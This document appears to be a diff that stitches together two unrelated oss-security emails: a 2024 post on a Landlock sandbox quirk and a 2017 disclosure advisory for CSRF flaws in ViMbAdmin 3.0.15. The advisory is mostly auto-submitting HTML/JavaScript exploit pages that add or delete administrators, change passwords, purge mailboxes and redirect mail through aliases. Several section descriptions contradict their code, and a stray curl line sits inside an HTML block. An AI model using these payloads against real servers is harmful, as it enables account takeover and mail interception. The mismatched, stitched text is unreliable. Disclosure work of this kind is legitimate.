@@ -1,4 +1,9 @@
-Received: (qmail 20244 invoked by uid 550); 20 May 2024 11:59:07 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["9777" "Wednesday" "3" "May" "2017" "16:01:24" "+0200" "Sysdream Labs" "labs@sysdream.com" "<d3659d35-b9d9-9648-de14-88de7b488630@sysdream.com>" "367" "[oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15" nil nil nil "5" "2017050314:01:24" "[oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15" (number mark "U       labs@sysdrea May  3  367/9777  " thread-indent "\"[oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 3206 invoked by uid 550); 3 May 2017 14:01:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,107 +12,393 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30619 invoked from network); 20 May 2024 09:42:52 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hexsys.org;
-	s=protonmail; t=1716198162; x=1716457362;
-	bh=EZp+H4SW0wZoj4LEy+UeZli7yebRyjOJ6sQLxSGbbKY=;
-	h=Date:To:From:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
-	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
-	b=dcd7RzhpYUzdeM27jr4tyClQE6PEsmncD/4IslvRnT9ohXmSmpiBg01SI5E498AvP
-	 78HJzWH7bE3F4es+D60rT5uQEVy+W4yn9YPpHzafXLB2DfW77nteqIHy4fUFUa/kdw
-	 QsjuYDHcVqSicYWGSParDyfsXazbK70X7vkjs0oKFwO4uDMpDpoqD4BioFsPgm+X96
-	 UZdvROQRSWZULxEyoKNbPjTaG7+CQBguIeZwVHZOgA2aE6xwqU4Zww8Y5ZHroOtEIm
-	 X4RNOGx4XfBkYAEsd16L/R2TgJ+6eGRGHjmBY30W7X9aOWV4gLJwiFAEJL9kGVAr62
-	 ArXzCICeXEOkA==
-Date: Mon, 20 May 2024 09:42:38 +0000
+Received: (qmail 3180 invoked from network); 3 May 2017 14:01:53 -0000
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 057571A114E
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
+	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1493820094;
+	bh=ogtFiuRx2Y83+DUrCpI9VgGP7/xbC/uz4b3vZuYjts8=;
+	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
+	b=RQwnt2Nwy6zKgbwh2gESLZnLFk71ubWcDLaBS+jcKzxfvok6ymq3mzjOEwDWcAyyQ
+	 eYdcAX7XuvG6wIte7q95VNgVYK3bs0hgqKyhfAeq53Gosbr6kp+y8/tuTYoQ9u/kBh
+	 iYEg+eOfMqPIaVtdP8JhVaAMG2ylAkUqYvH60bS0=
 To: oss-security@lists.openwall.com
-From: Ali Polatel <alip@hexsys.org>
-Message-ID: <ykmy97joESH91bCHsZwXrM1OS3YcckmX8UcuxUQ6ogsxZjKI9lox0cTS-HuVaVUgn7fcmBdjRV4kdvZU3X5J6j8Ro1OJKzl1DHnka9f6g-M=@hexsys.org>
-Feedback-ID: 105281019:user:proton
-X-Pm-Message-ID: 25d4a1045fba5cd8b043867ab99ce5d3d783cb62
+Cc: fulldisclosure@seclists.org
+From: Sysdream Labs <labs@sysdream.com>
+Message-ID: <d3659d35-b9d9-9648-de14-88de7b488630@sysdream.com>
+Date: Wed, 3 May 2017 16:01:24 +0200
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.0
 MIME-Version: 1.0
-Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha512; boundary="------8bd1592706eb5cb66b520a7c68c7619d637e5234a036780ea1abab67b80af04c"; charset=utf-8
-Subject: [oss-security] Article: State of Sandboxing in Linux
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="eaar3dvnVQLr84cO9dbt8G49qVirk1NeI"
+Subject: [oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version
+ 3.0.15
 
---------8bd1592706eb5cb66b520a7c68c7619d637e5234a036780ea1abab67b80af04c
-Content-Type: multipart/mixed;boundary=---------------------5c291565e01ddeb848052e4e8db936ae
+--eaar3dvnVQLr84cO9dbt8G49qVirk1NeI
+Content-Type: multipart/mixed; boundary="J1S7bSWc9JJlA7A0aNmRtRwBcS9LguR8E";
+ protected-headers="v1"
+From: Sysdream Labs <labs@sysdream.com>
+To: oss-security@lists.openwall.com
+Cc: fulldisclosure@seclists.org
+Message-ID: <d3659d35-b9d9-9648-de14-88de7b488630@sysdream.com>
+Subject: [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version
+ 3.0.15
 
------------------------5c291565e01ddeb848052e4e8db936ae
+--J1S7bSWc9JJlA7A0aNmRtRwBcS9LguR8E
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
 Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;charset=utf-8
 
-Hello list,
+# [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15
 
-I want to share an article I wrote on Linux Sandboxing:
-https://git.sr.ht/~alip/syd/tree/main/item/doc/toctou-or-gtfo.md
+## Product Description
 
-There's nothing new in there except something I discovered on Landlock whic=
-h may be a bug or a feature.
-TL;DR Landlock allows you to chdir into a directory that's not allowlisted.=
- That's it though, you can
-not list/read anything in there so I'd not say this is anything more than a=
- potential info leak (as in
-you discovered the dir existed). That said, I am not quite sure.
+ViMbAdmin is a web-based interface used to manage a mail server with virtua=
+l domains, mailboxes and aliases. It is an open source solution developed b=
+y Opensolutions and distributed under the GNU/GPL license version 3. The of=
+ficial web site can be found at http://www.vimbadmin.net and the source cod=
+e of the application is available on github https://github.com/opensolution=
+s.
 
-Very small PoC for those who do no want to read the article:
-(-plib turns all seccomp sandboxing off so we apply a very simple landlock =
-sandbox
-only allowing /usr, busybox is static linked)
+## Details
 
-=E2=87=92 syd -plib -msandbox/lock:on -m allow/lock/read+/lib -m allow/lock=
-/read+/usr busybox sh
-~/src/syd/syd-3 $ cd /tmp
-/tmp $ busybox ls
-ls: can't open '.': Permission denied
-/tmp $
+**CVE ID**: CVE-2017-6086
 
-I could enter /tmp although that's not allowlisted by Landlock.
+**Access Vector**: remote
 
-Best regards,
-Ali Polatel
+**Security Risk**: high
 
-PS: Initially I've sent this e-mail using the wrong e-mail address (was not=
- subscribed
-to the list), so this is a resend. I apologize if you end up receiving it t=
-wice.=
+**Vulnerability**: CWE-352
 
------------------------5c291565e01ddeb848052e4e8db936ae
-Content-Type: application/pgp-keys; filename="publickey - alip@hexsys.org - 0xC22DA9DE.asc"; name="publickey - alip@hexsys.org - 0xC22DA9DE.asc"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="publickey - alip@hexsys.org - 0xC22DA9DE.asc"; name="publickey - alip@hexsys.org - 0xC22DA9DE.asc"
+**CVSS Base Score**: 8.8
 
-LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgp4ak1FWmdR
-SmRSWUpLd1lCQkFIYVJ3OEJBUWRBbjlaVnJMbi9tclpseThqTE9qVklwTmRW
-SXhTSVZ4WmUKL2ZDeDZpcTNPM1hOSVdGc2FYQkFhR1Y0YzNsekxtOXlaeUE4
-WVd4cGNFQm9aWGh6ZVhNdWIzSm5Qc0tNCkJCQVdDZ0ErQllKbUJBbDFCQXNK
-QndnSmtCY2phUTFHWTNTNkF4VUlDZ1FXQUFJQkFoa0JBcHNEQWg0QgpGaUVF
-d2kycDNrbUo2K2VhOUErdEZ5TnBEVVpqZExvQUFFaDlBUUNVRlB2YytPL1Fz
-YzdpVDF0STcvMTAKakJWaklPa2xyL01DU2lzZ2w0SzRqQUQvZkRaejVuVStq
-bzBmcjh3QXNLdFU0M1UrVWd5alVuNHhuczVQCnVzcFViZy9PT0FSbUJBbDFF
-Z29yQmdFRUFaZFZBUVVCQVFkQXFrait2ejdsbjQyNmhmQS9wSWZzelJKbQpW
-WHpLc1VJOWJQd3dqZEdQUlNRREFRZ0h3bmdFR0JZS0FDb0ZnbVlFQ1hVSmtC
-Y2phUTFHWTNTNkFwc00KRmlFRXdpMnAza21KNitlYTlBK3RGeU5wRFVaamRM
-b0FBTHNMQVAwWUVEUkw1OVdiUndSTFdpN0RlRjY2ClRCSzZtdmZGeG5maG9r
-M3JKSU1lWXdFQTZGNi85c1J6SzJqbExCRk9kbHluZGdZbEpxUFVpZk1CZGU5
-ego2QkZFY1FnPQo9NFhXSgotLS0tLUVORCBQR1AgUFVCTElDIEtFWSBCTE9D
-Sy0tLS0tCg==
+**CVSS vector**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
 
------------------------5c291565e01ddeb848052e4e8db936ae--
+## Proof of concept
 
---------8bd1592706eb5cb66b520a7c68c7619d637e5234a036780ea1abab67b80af04c
+### Add administrator user
+
+#### Exploit
+
+The following html/javascript code allows to delete an administrator user. =
+It needs to be visited by a logged administrator of the targeted ViMbAdmin =
+application.
+
+```html
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/admin/add" method=3D"PO=
+ST" target=3D"csrf-frame" >
+<input type=3D"text" name=3D"user" value=3D"target@email" >
+<input type=3D"text" name=3D"password" value=3D"newpassword" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+
+```
+
+#### Vulnerable code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadm=
+in directory>/application/controllers/DomainController.php` file.
+
+### Remove administrator user
+
+#### Exploit
+
+The following html/javascript code allows to delete an administrator user. =
+It needs to be visited by a logged administrator of the targeted ViMbAdmin =
+application.
+
+```html
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/admin/purge/aid/<admini=
+strator id>" method=3D"GET" target=3D"csrf-frame" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+```
+
+#### Vulnerable code
+
+The vulnerable code is located in the `purgeAction()` method of the `<vimba=
+dmin directory>/application/controllers/DomainController.php` file.
+
+### Change administrator password
+
+#### Exploit
+
+The following html/javascript code allows to update administrator password.=
+ It needs to be visited by a logged administrator of the targeted ViMbAdmin=
+ application.
+
+```html
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/admin/password/aid/<adm=
+inistrator id>" method=3D"POST" target=3D"csrf-frame" >
+<input type=3D"text" name=3D"password" value=3D"newpassword" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+```
+
+#### Vulnerable code
+
+The vulnerable code is located in the `passwordAction()` method of the `<vi=
+mbadmin directory>/application/controllers/DomainController.php` file.
+
+### Add mailbox address
+
+#### Exploit
+
+The following html/javascript code allows to update administrator password.=
+ It needs to be visited by a logged administrator of the targeted ViMbAdmin=
+ application.
+
+```html
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/mailbox/add/did/<domain=
+ id>" method=3D"POST" target=3D"csrf-frame" >
+<input type=3D"text" name=3D"local_part" value=3D"<fakeemail>" >
+<input type=3D"text" name=3D"domain" value=3D"<domain id>" >
+<input type=3D"text" name=3D"name" value=3D"<fake name>" >
+<input type=3D"text" name=3D"password" value=3D"<password>" >
+<input type=3D"text" name=3D"quota" value=3D"0" >
+<input type=3D"text" name=3D"alt_email" value=3D"" >
+<input type=3D"text" name=3D"cc_welcome_email" value=3D"" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+```
+
+#### Vulnerable code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadm=
+in directory>/application/controllers/MailboxController.php` file.
+
+### Purge mailbox
+
+#### Exploit
+
+The following html/javascript code allows to remove a mailbox address. It n=
+eeds to be visited by a logged administrator of the targeted ViMbAdmin appl=
+ication.
+
+```html
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/mailbox/purge/mid/<mail=
+box id>" method=3D"POST" target=3D"csrf-frame" >
+<input type=3D"text" name=3D"data" value=3D"purge" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+```
+
+#### Vulnerable code
+
+The vulnerable code is located in the `purgeAction()` method of the `<vimba=
+dmin directory>/application/controllers/MailboxController.php` file.
+
+### Archive mailbox
+
+#### Exploit
+
+The following html/javascript code allows to force the archival of a mailbo=
+x address. It needs to be visited by an administrator of the targeted ViMbA=
+dmin application.
+
+```html
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/archive/add/mid/<mailbo=
+x id>" method=3D"GET" target=3D"csrf-frame" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+```
+
+#### Vulnerable code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadm=
+in directory>/application/controllers/ArchiveController.php` file.
+
+### Add alias address
+
+#### Exploit
+
+The following html/javascript code allows to force the archival of a mailbo=
+x address. It needs to be visited by an administrator of the targeted ViMbA=
+dmin application.
+
+```html
+curl 'http://<ip>/alias/add/did/<domain id>'  --data 'local_part=3D<fake ma=
+ilbox>&domain=3D<domain id>&goto%5B%5D=3D<redirection email address>'
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/alias/add/did/<domain i=
+d>" method=3D"POST" target=3D"csrf-frame" >
+<input type=3D"text" name=3D"local_part" value=3D"<fake mailbox>" >
+<input type=3D"text" name=3D"domain" value=3D"<domain id>" >
+<input type=3D"text" name=3D"goto[]" value=3D"<redirection email address>" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+```
+
+#### Vulnerable code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadm=
+in directory>/application/controllers/AliasController.php` file.
+
+### Remove alias address
+
+#### Exploit
+
+The following html/javascript code allows the removal of a alias address. I=
+t needs to be visited by a logged administrator of the targeted ViMbAdmin a=
+pplication.
+
+```html
+<head>
+<title>CSRF ViMbAdmin</title>
+</head>
+<body>
+
+
+<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
+<form id=3D"csrf-form" action=3D"http://<target ip>/alias/delete/alid/<alia=
+s id>" method=3D"GET" target=3D"csrf-frame" >
+</form>
+
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+</body>
+```
+
+#### Vulnerable Code
+
+The vulnerable code is located in the `addAction()` method of the `<vimbadm=
+in directory>/application/controllers/AliasController.php` file.
+
+## Affected version
+
+* tested on version 3.0.15
+
+## Timeline (dd/mm/yyyy)
+
+* 22/01/2017 : Initial discovery.
+* 16/02/2017 : First contact with opensolutions.io
+* 16/02/2017 : Advisory sent.
+* 24/02/2017 : Reply from the owner, acknowledging the report and planning =
+to fix the vulnerabilities.
+* 13/03/2017 : Sysdream Labs request for an update.
+* 29/03/2017 : Second request for an update.
+* 29/03/2017 : Reply from the owner stating that he has no time to fix the =
+issues.
+* 03/05/2017 : Full disclosure.
+
+
+## Credits
+
+* Florian NIVETTE, Sysdream (f.nivette -at- sysdream -dot- com)
+
+--=20
+SYSDREAM Labs <labs@sysdream.com>
+
+GPG :
+47D1 E124 C43E F992 2A2E
+1551 8EB4 8CD9 D5B2 59A1
+
+* Website: https://sysdream.com/
+* Twitter: @sysdream
+
+
+
+--J1S7bSWc9JJlA7A0aNmRtRwBcS9LguR8E--
+
+--eaar3dvnVQLr84cO9dbt8G49qVirk1NeI
 Content-Type: application/pgp-signature; name="signature.asc"
 Content-Description: OpenPGP digital signature
 Content-Disposition: attachment; filename="signature.asc"
 
 -----BEGIN PGP SIGNATURE-----
-Version: ProtonMail
+Version: GnuPG v2
 
-wnUEARYKACcFgmZLGvYJkBcjaQ1GY3S6FiEEwi2p3kmJ6+ea9A+tFyNpDUZj
-dLoAAFhkAP0QNXHfy/4ya33EtMkJ7ddUCdQcr0+7w0mnfchtBRAw7wD+MAeM
-xphEJtjpohf1VdT3kyaTKcvDK6QVh7niThdDpwM=
-=AuC+
+iQIcBAEBCAAGBQJZCeK9AAoJEI60jNnVslmheMsQAIR3YaD1khgaRBsA4ovqhpvM
+HMHzLgCy0syWcR9oR0yx5KXQn0Ro64IU8m4KQkeo6zebFu6cdhVKzbslql1exs9R
+GvSsr/oPPgIRgHZCnBqINUVrw+JLp+AVgL1iRFMP4C1LD3jALJm7PdIOvfwwKm4q
+n/hQeVdLWJIjjcuDU1bRWrGkc6iYnSUl/XF2VwQBKC72xh4tTz7LAHda6btSSNtQ
+8WbXbpNI9Bev7Piz9vI/3eo4Vs43ksVDEtb8FRgGDVzdmWhW+aX4xDPhDrwFrnKD
+8SGN00jTNvD3z9MzgZ1ZAW8uwu3AYYZ6mWhjFh/Zlci87cAOpVm1SMn0loEit2JW
+YG5TbTNyi5Qb1u9czv6cRYR3YK4jQtyBLVw53fmBwm107MpuegvrDEGhHXs40vzd
+zWdf5ev2+/F67BGjCSXH8Ly2KcRZepomPbU+PUX+1KSjegrZOHxxTky/FxQlloX/
+tzYyqaru0F+zuoUw37gMe7A0rcQeESQcXs3Q3sGJ8C0BRmUAndjCYS4uu1B4KzkC
+bgnY4b/DYay/AD6XGhMQ3lL0Zd9EZ8oc1YZOYRsCsp4SHAIb0SFHPw5f+4yizsdE
+OJ/Sw2A/21tCnQ0fL9TLkzYJKJVxJN2lAKlVxzCMurxDtPo82NlHx6XY/yU41p0z
+vxrbPrhmH6URRIaLzDCI
+=R0Wg
 -----END PGP SIGNATURE-----
 
-
---------8bd1592706eb5cb66b520a7c68c7619d637e5234a036780ea1abab67b80af04c--
-
+--eaar3dvnVQLr84cO9dbt8G49qVirk1NeI--
